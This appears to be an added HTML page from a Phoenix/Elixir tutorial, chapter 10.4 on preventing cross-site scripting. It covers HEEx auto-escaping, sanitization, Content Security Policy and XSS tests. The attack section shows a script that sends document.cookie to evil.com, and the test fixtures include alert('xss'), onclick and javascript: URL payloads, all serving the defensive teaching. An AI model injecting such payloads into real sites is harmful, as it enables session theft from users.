@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>XSS Prevention &mdash; Let's Build with Elixir and Phoenix</title>
+    <link rel="stylesheet" type="text/css" href="assets/css/main.css">
+</head>
+<body>
+    <header>
+        <div class="wrapper">
+            <div>
+                <a href="index.html">Let's Build with Elixir and Phoenix</a>
+                <span class="crumbs">&rsaquo; XSS Prevention</span>
+            </div>
+            <div>
+                &lsaquo; <a href="10.03-sql-injection.html">Previous</a> &middot;
+                <a href="00.01-contents.html">Contents</a>
+                &middot; <a href="10.05-security-headers.html">Next</a> &rsaquo;
+            </div>
+        </div>
+    </header>
+    <main class="wrapper text">
+        <div class="chapter">Chapter 10.4</div>
+        <h1>Chapter 10.4: XSS Prevention</h1>
+
+<p>Cross-Site Scripting (XSS) allows attackers to inject malicious scripts. In this chapter, we'll explore how Phoenix prevents XSS and best practices for safe output.</p>
+
+<h2>Understanding XSS</h2>
+
+<h3>The Attack</h3>
+
+<figure class="code"><pre><code><!-- Attacker submits comment with script -->
+<script>
+<p>  fetch('https://evil.com/steal?cookie=' + document.cookie)</p>
+</script>
+
+<!-- If rendered without escaping -->
+<div class="comment">
+<p>  <script></p>
+<p>    fetch('https://evil.com/steal?cookie=' + document.cookie)</p>
+<p>  </script></p>
+</div>
+
+<!-- Script executes, stealing user's session -->
+</code></pre></figure>
+
+<h3>Types of XSS</h3>
+
+<p>| Type | Description | Example |</p>
+<p>|------|-------------|---------|</p>
+<p>| Stored | Saved in database, served to users | Comment with script |</p>
+<p>| Reflected | URL parameter reflected in page | Search query in results |</p>
+<p>| DOM-based | Client-side JS manipulation | URL hash manipulation |</p>
+
+<h2>Phoenix XSS Protection</h2>
+
+<h3>Automatic Escaping</h3>
+
+<p>HEEx templates automatically escape all output:</p>
+
+<figure class="code"><pre><code><%# User input is automatically escaped %>
+<p><%= @user_input %></p>
+
+<%# If user_input is "<script>alert('xss')</script>" %>
+<%# Renders as: %>
+<p>&lt;script&gt;alert('xss')&lt;/script&gt;</p>
+</code></pre></figure>
+
+<h3>How It Works</h3>
+
+<figure class="code"><pre><code># Phoenix.HTML.html_escape/1
+<p>iex> Phoenix.HTML.html_escape("<script>alert('xss')</script>")</p>
+<p>{:safe, "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;"}</p>
+
+<h1>Characters escaped:</h1>
+<h1>< → &lt;</h1>
+<h1>> → &gt;</h1>
+<h1>& → &amp;</h1>
+<h1>" → &quot;</h1>
+<h1>' → &#39;</h1>
+</code></pre></figure>
+
+<h3>Safe vs Unsafe Content</h3>
+
+<figure class="code"><pre><code><%# Safe - automatically escaped %>
+<p><%= @user_comment %></p>
+
+<%# DANGEROUS - raw output, no escaping %>
+<p><%= raw(@user_comment) %></p>
+<p><%= Phoenix.HTML.raw(@user_comment) %></p>
+</code></pre></figure>
+
+<h2>Contexts and Escaping</h2>
+
+<h3>HTML Context</h3>
+
+<figure class="code"><pre><code><%# Properly escaped for HTML context %>
+<p><%= @name %></p>
+<div class="user"><%= @bio %></div>
+</code></pre></figure>
+
+<h3>Attribute Context</h3>
+
+<figure class="code"><pre><code><%# Attributes are also escaped %>
+<input value={@user_input}>
+<a href={@url}>Link</a>
+
+<%# Phoenix escapes quotes in attributes %>
+<%# If @user_input is: " onclick="alert('xss') %>
+<%# Renders as: value="&quot; onclick=&quot;alert('xss')" %>
+</code></pre></figure>
+
+<h3>JavaScript Context</h3>
+
+<figure class="code"><pre><code><%# DANGEROUS - injecting into JavaScript %>
+<script>
+<p>  var userData = '<%= @user_data %>';  // NOT SAFE!</p>
+</script>
+
+<%# Safe - use JSON encoding %>
+<script>
+<p>  var userData = <%= raw(Jason.encode!(@user_data)) %>;</p>
+</script>
+
+<%# Better - use data attributes %>
+<div id="user-data" data-user={Jason.encode!(@user)}>
+</div>
+<script>
+<p>  var userData = JSON.parse(document.getElementById('user-data').dataset.user);</p>
+</script>
+</code></pre></figure>
+
+<h3>URL Context</h3>
+
+<figure class="code"><pre><code><%# Validate URL schemes %>
+<a href={@user_url}>Link</a>
+
+<%# Attacker could submit: javascript:alert('xss') %>
+<%# Validate in controller/context: %>
+</code></pre></figure>
+
+<figure class="code"><pre><code>def validate_url(url) do
+<p>  uri = URI.parse(url)</p>
+
+<p>  if uri.scheme in ["http", "https"] do</p>
+<p>    {:ok, url}</p>
+<p>  else</p>
+<p>    {:error, :invalid_scheme}</p>
+<p>  end</p>
+<p>end</p>
+</code></pre></figure>
+
+<h2>Safe HTML Rendering</h2>
+
+<h3>When You Need HTML</h3>
+
+<p>Sometimes you need to render user-provided HTML (e.g., rich text editors):</p>
+
+<figure class="code"><pre><code># Add dependency
+<p>{:html_sanitize_ex, "~> 1.4"}</p>
+</code></pre></figure>
+
+<h3>Sanitization</h3>
+
+<figure class="code"><figcaption>File: lib/snippetbox/sanitizer.ex</figcaption><pre><code class="language-elixir">
+<p>defmodule Snippetbox.Sanitizer do</p>
+<p>  @moduledoc """</p>
+<p>  HTML sanitization for user content.</p>
+<p>  """</p>
+
+<p>  @doc """</p>
+<p>  Basic HTML - allows formatting tags only.</p>
+<p>  """</p>
+<p>  def basic_html(html) do</p>
+<p>    HtmlSanitizeEx.basic_html(html)</p>
+<p>  end</p>
+
+<p>  @doc """</p>
+<p>  Markdown HTML - allows more tags for rendered markdown.</p>
+<p>  """</p>
+<p>  def markdown_html(html) do</p>
+<p>    HtmlSanitizeEx.markdown_html(html)</p>
+<p>  end</p>
+
+<p>  @doc """</p>
+<p>  Strip all HTML tags.</p>
+<p>  """</p>
+<p>  def strip_tags(html) do</p>
+<p>    HtmlSanitizeEx.strip_tags(html)</p>
+<p>  end</p>
+
+<p>  @doc """</p>
+<p>  Custom sanitization with specific allowed tags.</p>
+<p>  """</p>
+<p>  def custom_html(html) do</p>
+<p>    HtmlSanitizeEx.Scrubber.scrub(html, CustomScrubber)</p>
+<p>  end</p>
+<p>end</p>
+
+<h1>Custom scrubber</h1>
+<p>defmodule Snippetbox.Sanitizer.CustomScrubber do</p>
+<p>  require HtmlSanitizeEx.Scrubber.Meta</p>
+<p>  alias HtmlSanitizeEx.Scrubber.Meta</p>
+
+<p>  # Allow specific tags</p>
+<p>  Meta.allow_tag_with_uri_attributes("a", ["href"], ["http", "https"])</p>
+<p>  Meta.allow_tag_with_these_attributes("a", ["title"])</p>
+<p>  Meta.allow_tag_with_these_attributes("p", [])</p>
+<p>  Meta.allow_tag_with_these_attributes("br", [])</p>
+<p>  Meta.allow_tag_with_these_attributes("strong", [])</p>
+<p>  Meta.allow_tag_with_these_attributes("em", [])</p>
+<p>  Meta.allow_tag_with_these_attributes("code", ["class"])</p>
+<p>  Meta.allow_tag_with_these_attributes("pre", ["class"])</p>
+
+<p>  # Strip everything else</p>
+<p>  Meta.strip_everything_not_covered()</p>
+<p>end</p>
+</code></pre></figure>
+
+<h3>Using Sanitized HTML</h3>
+
+<figure class="code"><pre><code># In changeset
+<p>def changeset(comment, attrs) do</p>
+<p>  comment</p>
+<p>  |> cast(attrs, [:content])</p>
+<p>  |> sanitize_content()</p>
+<p>end</p>
+
+<p>defp sanitize_content(changeset) do</p>
+<p>  case get_change(changeset, :content) do</p>
+<p>    nil -> changeset</p>
+<p>    content -></p>
+<p>      sanitized = Snippetbox.Sanitizer.basic_html(content)</p>
+<p>      put_change(changeset, :content, sanitized)</p>
+<p>  end</p>
+<p>end</p>
+</code></pre></figure>
+
+<figure class="code"><pre><code><%# Now safe to render as raw %>
+<div class="comment">
+<p>  <%= raw(@comment.content) %></p>
+</div>
+</code></pre></figure>
+
+<h2>Content Security Policy</h2>
+
+<h3>Preventing Inline Scripts</h3>
+
+<p>CSP blocks XSS even if other defenses fail:</p>
+
+<figure class="code"><figcaption>File: lib/snippetbox_web/plugs/csp.ex</figcaption><pre><code class="language-elixir">
+<p>defmodule SnippetboxWeb.Plugs.CSP do</p>
+<p>  import Plug.Conn</p>
+
+<p>  def init(opts), do: opts</p>
+
+<p>  def call(conn, _opts) do</p>
+<p>    put_resp_header(conn, "content-security-policy", csp_policy())</p>
+<p>  end</p>
+
+<p>  defp csp_policy do</p>
+<p>    [</p>
+<p>      "default-src 'self'",</p>
+<p>      "script-src 'self'",           # No inline scripts</p>
+<p>      "style-src 'self' 'unsafe-inline'",  # Allow inline styles</p>
+<p>      "img-src 'self' data: https:",</p>
+<p>      "font-src 'self'",</p>
+<p>      "connect-src 'self' wss:",</p>
+<p>      "frame-ancestors 'none'"</p>
+<p>    ]</p>
+<p>    |> Enum.join("; ")</p>
+<p>  end</p>
+<p>end</p>
+</code></pre></figure>
+
+<h3>With Nonces for Inline Scripts</h3>
+
+<figure class="code"><pre><code>defmodule SnippetboxWeb.Plugs.CSPNonce do
+<p>  import Plug.Conn</p>
+
+<p>  def init(opts), do: opts</p>
+
+<p>  def call(conn, _opts) do</p>
+<p>    nonce = generate_nonce()</p>
+
+<p>    conn</p>
+<p>    |> assign(:csp_nonce, nonce)</p>
+<p>    |> put_resp_header("content-security-policy", csp_policy(nonce))</p>
+<p>  end</p>
+
+<p>  defp generate_nonce do</p>
+<p>    :crypto.strong_rand_bytes(16) |> Base.encode64()</p>
+<p>  end</p>
+
+<p>  defp csp_policy(nonce) do</p>
+<p>    "default-src 'self'; script-src 'self' 'nonce-#{nonce}'"</p>
+<p>  end</p>
+<p>end</p>
+</code></pre></figure>
+
+<figure class="code"><pre><code><%# Use nonce for inline scripts %>
+<script nonce={@csp_nonce}>
+<p>  // This script will execute</p>
+</script>
+
+<script>
+<p>  // This will be blocked by CSP</p>
+</script>
+</code></pre></figure>
+
+<h2>Common XSS Vectors</h2>
+
+<h3>User-Generated Links</h3>
+
+<figure class="code"><pre><code># Validate URLs before storing
+<p>def changeset(profile, attrs) do</p>
+<p>  profile</p>
+<p>  |> cast(attrs, [:website])</p>
+<p>  |> validate_url(:website)</p>
+<p>end</p>
+
+<p>defp validate_url(changeset, field) do</p>
+<p>  validate_change(changeset, field, fn _, url -></p>
+<p>    case URI.parse(url) do</p>
+<p>      %URI{scheme: scheme} when scheme in ["http", "https"] -> []</p>
+<p>      _ -> [{field, "must be a valid http(s) URL"}]</p>
+<p>    end</p>
+<p>  end)</p>
+<p>end</p>
+</code></pre></figure>
+
+<h3>JSON Data in Templates</h3>
+
+<figure class="code"><pre><code><%# Safe JSON embedding %>
+<script type="application/json" id="initial-data">
+<p>  <%= raw(Jason.encode!(@data)) %></p>
+</script>
+
+<%# In JavaScript %>
+<script>
+<p>  const data = JSON.parse(document.getElementById('initial-data').textContent);</p>
+</script>
+</code></pre></figure>
+
+<h3>SVG Files</h3>
+
+<figure class="code"><pre><code># SVG can contain JavaScript
+<h1>Sanitize or serve with content-type restrictions</h1>
+
+<p>def serve_upload(conn, %{"filename" => filename}) do</p>
+<p>  path = upload_path(filename)</p>
+
+<p>  # Force download for dangerous types</p>
+<p>  if dangerous_file_type?(filename) do</p>
+<p>    send_download(conn, {:file, path}, filename: filename)</p>
+<p>  else</p>
+<p>    send_file(conn, 200, path)</p>
+<p>  end</p>
+<p>end</p>
+
+<p>defp dangerous_file_type?(filename) do</p>
+<p>  ext = Path.extname(filename) |> String.downcase()</p>
+<p>  ext in [".svg", ".html", ".htm", ".xml"]</p>
+<p>end</p>
+</code></pre></figure>
+
+<h2>Testing for XSS</h2>
+
+<h3>Controller Tests</h3>
+
+<figure class="code"><figcaption>File: test/snippetbox_web/controllers/snippet_controller_test.exs</figcaption><pre><code class="language-elixir">
+<p>describe "XSS prevention" do</p>
+<p>  test "escapes script tags in title", %{conn: conn} do</p>
+<p>    {:ok, snippet} = Snippets.create_snippet(%{</p>
+<p>      title: "<script>alert('xss')</script>",</p>
+<p>      content: "test"</p>
+<p>    })</p>
+
+<p>    conn = get(conn, ~p"/snippets/#{snippet}")</p>
+<p>    html = html_response(conn, 200)</p>
+
+<p>    # Script should be escaped, not rendered</p>
+<p>    refute html =~ "<script>alert"</p>
+<p>    assert html =~ "&lt;script&gt;"</p>
+<p>  end</p>
+
+<p>  test "escapes event handlers in attributes", %{conn: conn} do</p>
+<p>    {:ok, snippet} = Snippets.create_snippet(%{</p>
+<p>      title: ~s(" onclick="alert('xss')),</p>
+<p>      content: "test"</p>
+<p>    })</p>
+
+<p>    conn = get(conn, ~p"/snippets/#{snippet}")</p>
+<p>    html = html_response(conn, 200)</p>
+
+<p>    refute html =~ ~s(onclick="alert)</p>
+<p>  end</p>
+<p>end</p>
+</code></pre></figure>
+
+<h3>Security Headers Test</h3>
+
+<figure class="code"><pre><code>test "includes CSP header", %{conn: conn} do
+<p>  conn = get(conn, ~p"/")</p>
+
+<p>  csp = get_resp_header(conn, "content-security-policy") |> List.first()</p>
+
+<p>  assert csp =~ "default-src"</p>
+<p>  assert csp =~ "script-src"</p>
+<p>end</p>
+</code></pre></figure>
+
+<h2>XSS Checklist</h2>
+
+<ul>
+<li>[ ] All output uses HEEx templates (auto-escaped)</li>
+<li>[ ] <code>raw/1</code> only used with sanitized content</li>
+<li>[ ] URLs validated for safe schemes</li>
+<li>[ ] JSON embedded safely</li>
+<li>[ ] CSP headers configured</li>
+<li>[ ] File uploads properly handled</li>
+<li>[ ] User HTML sanitized before storage</li>
+<li>[ ] No dynamic JavaScript generation with user input</li>
+</ul>
+
+<blockquote class="fp-concept">
+<strong>FP Concept: Output Encoding by Default</strong>
+</blockquote>
+<p>></p>
+<blockquote>
+<p>Phoenix follows the principle of safe defaults:</p>
+</blockquote>
+<p>></p>
+<blockquote>
+<figure class="code"><pre><code>> # Safe by default - must explicitly opt out
+<%= @user_input %>  # Escaped
+</blockquote>
+<p>></p>
+<blockquote>
+<p># Explicit unsafe operation</p>
+<%= raw(@sanitized_html) %>  # Developer acknowledges risk
+</code></pre></figure>
+</blockquote>
+<p>></p>
+<blockquote>
+<p>This makes security the path of least resistance.</p>
+</blockquote>
+
+<h2>Summary</h2>
+
+<p>In this chapter, we learned:</p>
+
+<ul>
+<li>How XSS attacks work</li>
+<li>Phoenix's automatic output escaping</li>
+<li>Different contexts requiring different handling</li>
+<li>HTML sanitization for rich content</li>
+<li>Content Security Policy</li>
+<li>Common XSS vectors and mitigations</li>
+<li>Testing for XSS vulnerabilities</li>
+</ul>
+
+<p>In the next chapter, we'll explore security headers.</p>
+
+    </main>
+    <footer>
+        <div class="wrapper">
+            <div>
+                &lsaquo; <a href="10.03-sql-injection.html">Previous</a>
+            </div>
+            <div>
+                <a href="00.01-contents.html">Contents</a>
+            </div>
+            <div>
+                <a href="10.05-security-headers.html">Next</a> &rsaquo;
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
